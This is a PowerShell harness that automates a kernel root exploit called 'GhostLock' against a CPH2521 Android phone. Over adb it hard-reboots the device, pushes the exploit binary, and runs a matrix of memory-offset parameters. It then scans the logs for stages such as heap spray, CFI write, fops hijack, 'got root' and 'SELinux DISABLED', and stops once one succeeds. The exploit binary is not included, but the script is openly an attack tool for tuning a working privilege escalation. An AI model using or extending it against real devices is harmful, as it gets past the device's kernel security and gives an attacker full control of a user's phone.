# Automated clean-boot matrix for CPH2521 GhostLock.
# Between each try: HARD reboot via `adb reboot`, wait uptime<=MaxUptimeSec, run once, pull logs.
# Never chains softboots. Never adb kill-server.
#
# Usage:
#   .\iterate_matrix.ps1
#   .\iterate_matrix.ps1 -MaxTries 12 -MaxUptimeSec 50

param(
  [string]$AdbHost = "192.168.1.108",
  [int]$AdbPort = 5555,
  [int]$MaxUptimeSec = 50,
  [int]$MaxTries = 16,
  [int]$RebootWaitSec = 300,
  [string]$Kphys = "0xa8000000",
  [string]$ResultsDir = "C:\Users\LENOVO\Temp\grok-cph2521-quest\matrix_results",
  [string[]]$SkipTags = @(),
  [switch]$NoRebuild
)

$ErrorActionPreference = "Continue"
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path
$Bin = Join-Path $Root "ghostlock-cph2521"
$Wifi = "${AdbHost}:${AdbPort}"
New-Item -ItemType Directory -Force -Path $ResultsDir | Out-Null
$summary = Join-Path $ResultsDir ("matrix_{0}.csv" -f (Get-Date -Format "yyyyMMdd_HHmmss"))
$log = Join-Path $ResultsDir ("matrix_{0}.log" -f (Get-Date -Format "yyyyMMdd_HHmmss"))

function MLog([string]$m) {
  $line = "[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m
  Write-Host $line
  Add-Content -Path $log -Value $line
}

function Get-AnySerial {
  # Prefer USB (reliable across softboot); wifi is bonus for post-pull.
  # Never adb kill-server. Soft-fail connect.
  try { adb connect $Wifi 2>$null | Out-Null } catch {}
  $lines = @()
  try { $lines = @(adb devices 2>$null) } catch { return $null }
  # USB first
  foreach ($line in $lines) {
    if ($line -match '^(\S+)\s+device' -and $Matches[1] -notmatch ':') {
      $s = $Matches[1]
      $r = ""
      try { $r = adb -s $s shell "echo OK" 2>$null | Out-String } catch {}
      if ($r -match 'OK') { return $s }
    }
  }
  # wifi
  foreach ($line in $lines) {
    if ($line -match [regex]::Escape($Wifi) + '\s+device') {
      $r = ""
      try { $r = adb -s $Wifi shell "echo OK" 2>$null | Out-String } catch {}
      if ($r -match 'OK') { return $Wifi }
    }
  }
  # any other device
  foreach ($line in $lines) {
    if ($line -match '^(\S+)\s+device') {
      $s = $Matches[1]
      $r = ""
      try { $r = adb -s $s shell "echo OK" 2>$null | Out-String } catch {}
      if ($r -match 'OK') { return $s }
    }
  }
  return $null
}

function Get-Uptime([string]$Serial) {
  $up = adb -s $Serial shell "cat /proc/uptime" 2>$null | Out-String
  if ($up -match '([0-9]+(?:\.[0-9]+)?)') { return [double]$Matches[1] }
  return -1
}

function Wait-Device([int]$TimeoutSec = 300) {
  $deadline = (Get-Date).AddSeconds($TimeoutSec)
  while ((Get-Date) -lt $deadline) {
    adb connect $Wifi 2>$null | Out-Null
    $s = Get-AnySerial
    if ($s) {
      $bc = (adb -s $s shell "getprop sys.boot_completed" 2>$null | Out-String).Trim()
      if ($bc -eq "1") { return $s }
    }
    Start-Sleep -Seconds 2
  }
  return $null
}

function Test-StorageReady([string]$Serial) {
  $st = adb -s $Serial shell "mkdir -p /storage/emulated/0/ghostlock_logs; touch /storage/emulated/0/ghostlock_logs/.w && rm /storage/emulated/0/ghostlock_logs/.w && echo STOR_OK" 2>$null | Out-String
  return ($st -match 'STOR_OK')
}

# Returns:
#   serial string on clean boot (uptime <= MaxUp, storage ready)
#   "STALE:<serial>" if device is up but past clean window
#   $null on timeout with no device
function Wait-CleanBoot([int]$TimeoutSec = 400, [int]$MaxUp = 50, [switch]$KeepPollingOnStale) {
  $deadline = (Get-Date).AddSeconds($TimeoutSec)
  $lastStaleLog = [datetime]::MinValue
  while ((Get-Date) -lt $deadline) {
    adb connect $Wifi 2>$null | Out-Null
    $s = Get-AnySerial
    if ($s) {
      $bc = (adb -s $s shell "getprop sys.boot_completed" 2>$null | Out-String).Trim()
      $up = Get-Uptime $s
      if ($bc -eq "1" -and $up -ge 0 -and $up -le $MaxUp) {
        if (Test-StorageReady $s) {
          MLog ("CLEAN BOOT serial={0} uptime={1:n1}s" -f $s, $up)
          return $s
        }
        MLog ("shell OK uptime={0:n1}s but storage not ready..." -f $up)
      } elseif ($bc -eq "1" -and $up -gt $MaxUp) {
        if (-not $KeepPollingOnStale) {
          MLog ("stale uptime={0:n1}s - will hard reboot" -f $up)
          return "STALE:$s"
        }
        # After a reboot we may connect late; keep polling briefly in case
        # uptime reading glitches, but surface STALE if stuck high.
        if (((Get-Date) - $lastStaleLog).TotalSeconds -ge 15) {
          MLog ("still stale uptime={0:n1}s (keep-polling mode)" -f $up)
          $lastStaleLog = Get-Date
        }
        # If clearly past window (> MaxUp+30), return STALE so caller reboots again
        if ($up -gt ($MaxUp + 30)) {
          MLog ("missed clean window uptime={0:n1}s - need another hard reboot" -f $up)
          return "STALE:$s"
        }
      }
    }
    Start-Sleep -Seconds 1
  }
  return $null
}

function Enable-WifiAdb([string]$Serial) {
  if ($Serial -match ':') { return $Serial }
  MLog "enabling tcpip $AdbPort on USB serial $Serial"
  adb -s $Serial tcpip $AdbPort 2>&1 | Out-Null
  Start-Sleep -Seconds 1
  adb connect $Wifi 2>&1 | Out-Null
  $w = Get-AnySerial
  if ($w) { return $w }
  return $Serial
}

function Invoke-HardReboot {
  # Retry hard reboots until we catch a low-uptime clean window.
  for ($attempt = 1; $attempt -le 4; $attempt++) {
    $s = Get-AnySerial
    if (-not $s) {
      MLog "no device for reboot - waiting up to 300s..."
      $s = Wait-Device 300
    }
    if (-not $s) {
      MLog "cannot reboot - no device yet (attempt $attempt) - keep waiting"
      $s = Wait-Device 300
    }
    if (-not $s) { MLog "cannot reboot - no device after long wait"; if ($attempt -ge 4) { return $false }; continue }

    MLog "HARD REBOOT attempt=$attempt via adb -s $s reboot"
    # Prefer USB serial for reboot if both present (more reliable)
    $usb = $null
    foreach ($line in (adb devices 2>$null)) {
      if ($line -match '^(\S+)\s+device' -and $Matches[1] -notmatch ':') {
        $usb = $Matches[1]; break
      }
    }
    if ($usb) { $s = $usb; MLog "using USB serial $s for reboot" }
    adb -s $s reboot 2>&1 | Out-Null
    Start-Sleep -Seconds 6

    # Wait until device disappears (or uptime resets after reconnect)
    $deadline = (Get-Date).AddSeconds([Math]::Min($RebootWaitSec, 90))
    $gone = $false
    while ((Get-Date) -lt $deadline) {
      $cur = Get-AnySerial
      if (-not $cur) { $gone = $true; break }
      Start-Sleep -Seconds 1
    }
    if (-not $gone) {
      MLog "device still visible after reboot cmd - waiting for uptime reset..."
    }
    Start-Sleep -Seconds 3

    # Poll aggressively for clean boot; if we miss the window, loop and reboot again
    $s2 = Wait-CleanBoot -TimeoutSec $RebootWaitSec -MaxUp $MaxUptimeSec -KeepPollingOnStale
    if ($s2 -and $s2 -notlike 'STALE:*') {
      $null = Enable-WifiAdb $s2
      $up = Get-Uptime (Get-AnySerial)
      if ($up -ge 0 -and $up -le ($MaxUptimeSec + 15)) {
        MLog ("hard reboot OK uptime={0:n1}s" -f $up)
        return $true
      }
      MLog ("clean window slipped after enable (uptime={0:n1}s) - retry reboot" -f $up)
      continue
    }
    MLog "no clean boot after reboot attempt=$attempt (got $s2) - retry"
  }
  MLog "hard reboot failed after retries"
  return $false
}

function Deploy([string]$Serial) {
  adb -s $Serial shell "mkdir -p /data/local/tmp/a /data/local/tmp/ghostlock_run /storage/emulated/0/ghostlock_logs" 2>$null | Out-Null
  adb -s $Serial push $Bin /data/local/tmp/a/e 2>&1 | Out-Null
  $scripts = Join-Path $Root "device_scripts"
  foreach ($n in @("collect_log.sh","run_ghost_test.sh","post_reboot_collect.sh")) {
    adb -s $Serial push (Join-Path $scripts $n) "/data/local/tmp/$n" 2>&1 | Out-Null
  }
  adb -s $Serial shell "chmod 755 /data/local/tmp/a/e /data/local/tmp/*.sh" 2>$null | Out-Null
}

function Run-One {
  param(
    [string]$Serial,
    [hashtable]$EnvMap,
    [string]$Tag
  )
  $exports = @(
    "export KPHYS=$Kphys",
    "export GHOST_BIN=/data/local/tmp/a/e",
    "export CLEAN=0",
    "export SKIP_DRAIN=1",
    "export LIGHT_DRAIN=1"
  )
  foreach ($k in $EnvMap.Keys) {
    $exports += "export $k=$($EnvMap[$k])"
  }
  $envLine = $exports -join "; "
  MLog "RUN $Tag :: $envLine"

  # clean session logs only
  adb -s $Serial shell "rm -f /storage/emulated/0/ghostlock_logs/ghost_log.txt /storage/emulated/0/ghostlock_logs/exploit*.txt /storage/emulated/0/ghostlock_logs/run_console.txt /storage/emulated/0/ghostlock_logs/logcat.txt /storage/emulated/0/ghostlock_logs/meta.txt /storage/emulated/0/ghostlock_logs/dmesg*.txt /storage/emulated/0/ghostlock_logs/kernel_hints.txt /storage/emulated/0/ghostlock_logs/post_reboot_*.txt 2>/dev/null; mkdir -p /storage/emulated/0/ghostlock_logs; echo CLEANED" 2>$null | Out-Null

  $once = "/data/local/tmp/ghostlock_run/once.sh"
  $marker = "/data/local/tmp/ghostlock_run/test_running"
  $done = "/data/local/tmp/ghostlock_run/test_done"
  # Build once.sh with literal $? for toybox/sh (avoid PowerShell expansion)
  $d = [string][char]36
  $body = @(
    '#!/system/bin/sh'
    $envLine
    "rm -f $marker $done"
    "touch $marker"
    'sh /data/local/tmp/run_ghost_test.sh > /storage/emulated/0/ghostlock_logs/run_console.txt 2>&1'
    ("echo {0}? > {1}" -f $d, $done)
    "rm -f $marker"
  ) -join "`n"
  $localOnce = Join-Path $ResultsDir ("once_{0}.sh" -f $Tag)
  Set-Content -Path $localOnce -Value ($body + "`n") -Encoding ascii
  adb -s $Serial push $localOnce $once 2>&1 | Out-Null
  adb -s $Serial shell "chmod 755 $once; sh $once >/dev/null 2>&1 & sleep 1; echo SPAWNED" 2>&1 | Out-Null

  $waited = 0
  $lost = $false
  $maxW = 150
  while ($waited -lt $maxW) {
    Start-Sleep -Seconds 2
    $waited += 2
    $s2 = Get-AnySerial
    if (-not $s2) {
      MLog "device lost +${waited}s (softboot likely)"
      $lost = $true
      break
    }
    $st = adb -s $s2 shell "if [ -f $done ]; then echo DONE; cat $done; elif [ -f $marker ]; then echo RUN; else echo IDLE; fi" 2>$null | Out-String
    if ($st -match 'DONE') {
      MLog "finished: $($st.Trim() -replace "`r|`n",' ')"
      break
    }
    if (($waited % 12) -eq 0) { MLog "poll +${waited}s $($st.Trim())" }
  }

  # wait shell after softboot
  Start-Sleep -Seconds 5
  $s3 = Wait-Device 240
  if ($s3) {
    Start-Sleep -Seconds 3
    adb -s $s3 shell "sh /data/local/tmp/post_reboot_collect.sh" 2>$null | Out-Null
    $dest = Join-Path $ResultsDir $Tag
    New-Item -ItemType Directory -Force -Path $dest | Out-Null
    adb -s $s3 pull /storage/emulated/0/ghostlock_logs $dest 2>&1 | Out-Null
    # also try /sdcard
    if (-not (Test-Path (Join-Path $dest "ghostlock_logs"))) {
      adb -s $s3 pull /sdcard/ghostlock_logs $dest 2>&1 | Out-Null
    }
    MLog "pulled logs -> $dest"
    return (Analyze-Run $dest $Tag $lost)
  }
  MLog "no shell after run for $Tag"
  return @{ Tag=$Tag; Status="NO_SHELL"; Softboot=$lost; Stage="unknown" }
}

function Analyze-Run([string]$Dest, [string]$Tag, [bool]$Lost) {
  $raw = Get-ChildItem $Dest -Recurse -Filter "exploit_raw.txt" -EA SilentlyContinue | Select-Object -First 1
  $text = if ($raw) { Get-Content $raw.FullName -Raw -EA SilentlyContinue } else { "" }
  # Also scan ghost_log / exploit.txt if raw incomplete after softboot
  if ([string]::IsNullOrWhiteSpace($text) -or $text.Length -lt 80) {
    foreach ($n in @("ghost_log.txt","exploit.txt","run_console.txt")) {
      $alt = Get-ChildItem $Dest -Recurse -Filter $n -EA SilentlyContinue | Select-Object -First 1
      if ($alt) {
        $t2 = Get-Content $alt.FullName -Raw -EA SilentlyContinue
        if ($t2 -and $t2.Length -gt $text.Length) { $text = $t2 }
      }
    }
  }
  $stage = "no_raw"
  $status = "FAIL"
  $ksOk = ($text -match 'prepare_kernel_page ok')
  $ksAttempt = if ($text -match 'prepare_kernel_page ok attempt=(\d+)') { $Matches[1] } else { "?" }
  if ($text -match 'SELinux DISABLED|child is root|UMH root done|su ready|got root') {
    $status = "SUCCESS"
    $stage = "root"
  } elseif ($text -match 'cfi write ret=|CFI write|ashmem ioctl ok|fops hijack') {
    $stage = "cfi"
    $status = "PARTIAL"
  } elseif ($text -match 'route success|PI route done|pselect.*success|consumer_success') {
    $stage = "pselect_post"
    $status = "PARTIAL"
  } elseif ($text -match 'pselect pre-select') {
    $stage = "pselect_pre"
  } elseif ($text -match 'pselect route setup') {
    $stage = "pselect_setup"
  } elseif ($text -match 'heap spray done') {
    $stage = "spray_done"
  } elseif ($ksOk) {
    $stage = "page_ok"
  } elseif ($text -match 'offsets matched') {
    $stage = "offsets"
  } elseif ($text -match 'KernelSnitch mm_struct leak failed') {
    $stage = "ks_fail"
  }
  if ($Lost -and $status -ne "SUCCESS") { $status = "SOFTBOOT" }
  $line = "$Tag,$status,$stage,$Lost,ks=$ksAttempt"
  Add-Content -Path $summary -Value $line
  MLog "RESULT $line"
  # Durable stage markers (fsync'd) — best softboot forensic
  $stageFile = Get-ChildItem $Dest -Recurse -Filter "stage.txt" -EA SilentlyContinue | Select-Object -First 1
  $stageText = if ($stageFile) { Get-Content $stageFile.FullName -Raw -EA SilentlyContinue } else { "" }
  if ($stageText) {
    if ($stageText -match 'pselect_post_select') { $stage = "pselect_post" }
    elseif ($stageText -match 'pselect_pre_select') { $stage = "pselect_pre" }
    elseif ($stageText -match 'pselect_setup') { $stage = "pselect_setup" }
    elseif ($stageText -match 'waiter_after_requeue') { $stage = "after_requeue" }
    elseif ($stageText -match 'before_cmp_requeue') { $stage = "before_requeue" }
    elseif ($stageText -match 'spray_done') { $stage = "spray_done" }
  }
  # Save a short snippet for later
  $snip = Join-Path $Dest "analysis.txt"
  @(
    "tag=$Tag status=$status stage=$stage softboot=$Lost ks_attempt=$ksAttempt"
    "--- stage.txt ---"
    $stageText
    "--- last 40 lines of exploit text ---"
    (($text -split "`n") | Select-Object -Last 40)
  ) | Set-Content -Path $snip -Encoding utf8
  return @{ Tag=$Tag; Status=$status; Softboot=$Lost; Stage=$stage; Text=$text; StageText=$stageText }
}

# ---- matrix definition ----
# BREAKTHROUGH (2026-08-01): PSELECT_SHIFT=-2 survives pselect + CFI probe
# (cfi write errno=22 = fops redirect may not have landed; open ok).
# Prefer -2 family first, then nearby shifts / deltas / write1-only.
$matrix = @(
  @{ Tag="s-2_d-e80_w4";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s-2_d-e80_w1";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xe80"; FORCE_WRITE1="1" } },
  @{ Tag="s-2_d-e20_w4";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xe20" } },
  @{ Tag="s-2_d-e80_simple"; Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xe80"; PSELECT_SIMPLE_LAYOUT="1" } },
  @{ Tag="s-2_d-f00_w4";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xf00" } },
  @{ Tag="s-2_d-d80_w4";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xd80" } },
  @{ Tag="s-1_d-e80_w4";     Env=@{ PSELECT_SHIFT="-1"; SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s-3_d-e80_w4";     Env=@{ PSELECT_SHIFT="-3"; SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s-4_d-e80_w4";     Env=@{ PSELECT_SHIFT="-4"; SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s0_d-e80_w4";      Env=@{ PSELECT_SHIFT="0";  SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s2_d-e80_w4";      Env=@{ PSELECT_SHIFT="2";  SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s1_d-e80_w4";      Env=@{ PSELECT_SHIFT="1";  SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s-2_d-e40_w4";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xe40" } },
  @{ Tag="s-2_d-e00_w4";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xe00" } },
  @{ Tag="s-6_d-e80_w4";     Env=@{ PSELECT_SHIFT="-6"; SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s4_d-e80_w4";      Env=@{ PSELECT_SHIFT="4";  SKB_DATA_DELTA="-0xe80" } },
  @{ Tag="s-2_d-e20_w1";     Env=@{ PSELECT_SHIFT="-2"; SKB_DATA_DELTA="-0xe20"; FORCE_WRITE1="1" } },
  @{ Tag="s-1_d-e80_w1";     Env=@{ PSELECT_SHIFT="-1"; SKB_DATA_DELTA="-0xe80"; FORCE_WRITE1="1" } }
)

if ($SkipTags -and $SkipTags.Count -gt 0) {
  $matrix = @($matrix | Where-Object { $SkipTags -notcontains $_.Tag })
  MLog ("skipped tags: {0}" -f ($SkipTags -join ','))
}
if ($MaxTries -lt $matrix.Count) {
  $matrix = $matrix[0..($MaxTries-1)]
}

Set-Content -Path $summary -Value "tag,status,stage,softboot,ks" -Encoding utf8
MLog "=== MATRIX START tries=$($matrix.Count) maxUptime=$MaxUptimeSec ==="
MLog "summary=$summary log=$log"

# rebuild binary once with env hooks (unless -NoRebuild)
if (-not $NoRebuild) {
  MLog "rebuilding ghostlock-cph2521..."
  & powershell -ExecutionPolicy Bypass -File (Join-Path $Root "build_cph2521.ps1")
  if (-not (Test-Path $Bin)) { MLog "BUILD FAILED"; exit 1 }
} elseif (-not (Test-Path $Bin)) {
  MLog "binary missing and -NoRebuild set"; exit 1
}
MLog ("binary ready size={0}" -f (Get-Item $Bin).Length)

$results = @()
$slot = 0
foreach ($item in $matrix) {
  $slot++
  MLog "========== [$slot/$($matrix.Count)] $($item.Tag) =========="
  # Ensure clean hard boot (hard reboot if stale or missing)
  $boot = Wait-CleanBoot -TimeoutSec 20 -MaxUp $MaxUptimeSec
  if ($boot -like 'STALE:*' -or -not $boot) {
    if (-not (Invoke-HardReboot)) {
      MLog "reboot failed - abort matrix"
      break
    }
    $boot = Wait-CleanBoot -TimeoutSec 90 -MaxUp $MaxUptimeSec
  }
  if (-not $boot -or $boot -like 'STALE:*') {
    MLog "no clean boot for $($item.Tag) after reboot - one more hard reboot"
    if (-not (Invoke-HardReboot)) {
      MLog "second reboot failed - skip $($item.Tag)"
      Add-Content -Path $summary -Value "$($item.Tag),SKIP,no_clean,False,ks=?"
      continue
    }
    $boot = Wait-CleanBoot -TimeoutSec 90 -MaxUp $MaxUptimeSec
  }
  if (-not $boot -or $boot -like 'STALE:*') {
    MLog "still no clean boot for $($item.Tag) - skip"
    Add-Content -Path $summary -Value "$($item.Tag),SKIP,no_clean,False,ks=?"
    continue
  }
  Deploy $boot
  # Prefer live serial after deploy (wifi may have switched)
  $boot = Get-AnySerial
  if (-not $boot) {
    MLog "lost device after deploy - skip"
    continue
  }
  $up = Get-Uptime $boot
  if ($up -gt ($MaxUptimeSec + 25)) {
    MLog "uptime drifted to $up before run - hard reboot and retry this slot once"
    if (Invoke-HardReboot) {
      $boot = Wait-CleanBoot -TimeoutSec 90 -MaxUp $MaxUptimeSec
      if ($boot -and $boot -notlike 'STALE:*') {
        Deploy $boot
        $boot = Get-AnySerial
      } else {
        Add-Content -Path $summary -Value "$($item.Tag),SKIP,uptime_drift,False,ks=?"
        continue
      }
    } else {
      continue
    }
  }
  $r = Run-One -Serial $boot -EnvMap $item.Env -Tag $item.Tag
  $results += $r
  if ($r.Status -eq "SUCCESS") {
    MLog "SUCCESS on $($item.Tag) - stopping matrix"
    break
  }
  if ($r.Status -eq "PARTIAL") {
    MLog "PARTIAL progress on $($item.Tag) stage=$($r.Stage) - continue matrix but note it"
  }
  # Always hard reboot before next (even if device still up)
  MLog "hard reboot before next config..."
  [void](Invoke-HardReboot)
}

MLog "=== MATRIX DONE ==="
MLog "CSV: $summary"
Get-Content $summary | ForEach-Object { MLog "  $_" }
# print best
$best = $results | Where-Object { $_.Status -eq "SUCCESS" -or $_.Status -eq "PARTIAL" } | Select-Object -First 3
if ($best) {
  MLog "Interesting results:"
  $best | ForEach-Object { MLog ("  {0} {1} stage={2}" -f $_.Tag, $_.Status, $_.Stage) }
} else {
  MLog "No SUCCESS/PARTIAL - all softboot or fail at spray/pselect"
}
